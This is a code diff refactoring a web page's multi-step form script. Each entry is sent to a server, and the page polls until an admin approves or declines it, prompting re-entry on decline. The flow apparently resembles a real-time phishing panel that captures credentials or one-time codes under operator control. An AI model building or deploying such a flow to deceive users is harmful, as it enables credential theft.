@@ -266,42 +266,47 @@ button:disabled {
     <p>The verification sequence mockup concluded successfully.</p>
   </section>
 </main>
-
+    
 <script>
   let sessionId = null;
   let currentStage = null;
   let statusInterval = null;
 
-  // Initialize Session on Page Load
+  // 1. Automatically fetch a clean backend session on startup
   async function initSession() {
     try {
       const res = await fetch("/api/session", { method: "POST" });
       const data = await res.json();
       sessionId = data.sessionId;
+      console.log("Session loaded successfully:", sessionId);
     } catch (err) {
       console.error("Session initialization failed:", err);
     }
   }
   initSession();
 
-  // Unified Request Submission Handler
-  async function submitStage(stage, payload, currentSectionId, nextSectionId) {
-    currentStage = stage;
-    
-    // Select DOM nodes for the active view context
+  // 2. Main workflow routing engine - maps steps safely
+  async function handleFormSubmit(stage, payload, currentSectionId, nextSectionId) {
+    currentStage = stage; // Explicitly update memory tracking state
+
     const container = document.getElementById(currentSectionId);
+    if (!container) return;
+
     const inputField = container.querySelector("input");
     const submitBtn = container.querySelector("button");
-    const spinner = container.querySelector(".loading-spinner, p:contains('Waiting')") || container.querySelector("p");
+    const spinnerText = container.querySelector(".loading-text") || container.querySelector("p:last-of-type");
 
-    // Freeze UI inputs during pending status
+    // Freeze active elements to prevent double submissions
     if (inputField) inputField.disabled = true;
     if (submitBtn) {
       submitBtn.disabled = true;
-      submitBtn.dataset.originalText = submitBtn.innerText;
+      submitBtn.setAttribute("disabled", "true");
+      if (!submitBtn.dataset.originalText) {
+        submitBtn.dataset.originalText = submitBtn.innerText;
+      }
       submitBtn.innerText = "Processing...";
     }
-    if (spinner) spinner.style.display = "block";
+    if (spinnerText) spinnerText.style.display = "block";
 
     try {
       const response = await fetch("/api/approval-request", {
@@ -311,70 +316,79 @@ button:disabled {
       });
       
       const result = await response.json();
-      if (result.ok && result.status === "pending") {
-        startPolling(currentSectionId, nextSectionId, inputField, submitBtn, spinner);
+      if (result.ok) {
+        // Handover operation directly to the server loop checker
+        startPolling(currentSectionId, nextSectionId, inputField, submitBtn, spinnerText);
+      } else {
+        resetUIElements(inputField, submitBtn, spinnerText);
       }
     } catch (error) {
-      console.error("Submission error:", error);
-      resetUIElement(inputField, submitBtn, spinner);
+      console.error("Submission failed:", error);
+      resetUIElements(inputField, submitBtn, spinnerText);
     }
   }
 
-  // Polling Loop Engine
-  function startPolling(currentSectionId, nextSectionId, inputField, submitBtn, spinner) {
-  if (statusInterval) clearInterval(statusInterval);
+  // 3. Polling core with explicit button click restore points
+  function startPolling(currentSectionId, nextSectionId, inputField, submitBtn, spinnerText) {
+    if (statusInterval) clearInterval(statusInterval);
 
-  statusInterval = setInterval(async () => {
-    try {
-      const response = await fetch(`/api/status?sessionId=${sessionId}&stage=${currentStage}`);
-      const result = await response.json();
+    statusInterval = setInterval(async () => {
+      try {
+        const response = await fetch(`/api/status?sessionId=${sessionId}&stage=${currentStage}`);
+        const result = await response.json();
 
-      // Case A: Approved
-      if (result.status === "approved") {
-        clearInterval(statusInterval);
-        document.getElementById(currentSectionId).style.display = "none";
-        document.getElementById(nextSectionId).style.display = "block";
-      } 
-      
-      // Case B: Declined by Admin
-      else if (result.status === "declined" || result.status === `declined_${currentStage}`) {
-        clearInterval(statusInterval); // Instantly kill the old hanging loop
+        // SCENARIO A: Approved -> Proceed smoothly to the next window view
+        if (result.status === "approved") {
+          clearInterval(statusInterval);
+          document.getElementById(currentSectionId).style.display = "none";
+          
+          const nextView = document.getElementById(nextSectionId);
+          if (nextView) nextView.style.display = "block";
+        } 
         
-        // 1. Unhide and hide layouts safely
-        if (spinner) spinner.style.display = "none";
+        // SCENARIO B: Declined -> Fully restore the click bindings and clear variables
+        else if (result.status === "declined" || result.status === `declined_${currentStage}`) {
+          clearInterval(statusInterval); // Instantly kill the waiting process loop
 
-        // 2. Fully re-enable the button state
-        if (submitBtn) {
-          submitBtn.disabled = false;
-          submitBtn.removeAttribute("disabled"); // Ensure browser frees the click block
-          submitBtn.innerText = "Next"; // Restore button text layout
+          // Clear loading text indicators safely
+          if (spinnerText) spinnerText.style.display = "none";
+
+          // Fully clear and re-activate input field element
+          if (inputField) {
+            inputField.disabled = false;
+            inputField.removeAttribute("disabled");
+            inputField.value = ""; // Erase previous entry values
+            inputField.focus();
+          }
+
+          // Fully restore the Click functionality and styles for the Next/Continue button
+          if (submitBtn) {
+            submitBtn.disabled = false;
+            submitBtn.removeAttribute("disabled");
+            submitBtn.innerText = submitBtn.dataset.originalText || "Next";
+          }
+
+          // Trigger feedback notification window safely after the thread re-renders
+          setTimeout(() => {
+            alert("The details entered were incorrect. Please re-enter.");
+          }, 100);
         }
-
-        // 3. Reset input field parameters
-        if (inputField) {
-          inputField.disabled = false;
-          inputField.removeAttribute("disabled");
-          inputField.value = ""; // Empty out incorrect values
-          inputField.focus(); // Snap mouse focus back to input box
-        }
-
-        // 4. Fire notifications safely *after* UI elements unlock
-        setTimeout(() => {
-          alert("Verification parameters incorrect. Please re-enter clean details.");
-        }, 100);
+      } catch (err) {
+        console.error("Server polling verification failed:", err);
       }
-    } catch (err) {
-      console.error("Polling validation failure:", err);
+    }, 2500); // Verify state intervals every 2.5 seconds
+  }
+
+  // Fallback interface restorer
+  function resetUIElements(input, btn, spin) {
+    if (input) {
+      input.disabled = false;
+      input.removeAttribute("disabled");
     }
-  }, 2500);
-}
-
-
-  function resetUIElement(input, btn, spin) {
-    if (input) input.disabled = false;
     if (btn) {
       btn.disabled = false;
-      btn.innerText = btn.dataset.originalText || "Submit";
+      btn.removeAttribute("disabled");
+      btn.innerText = btn.dataset.originalText || "Next";
     }
     if (spin) spin.style.display = "none";
   }
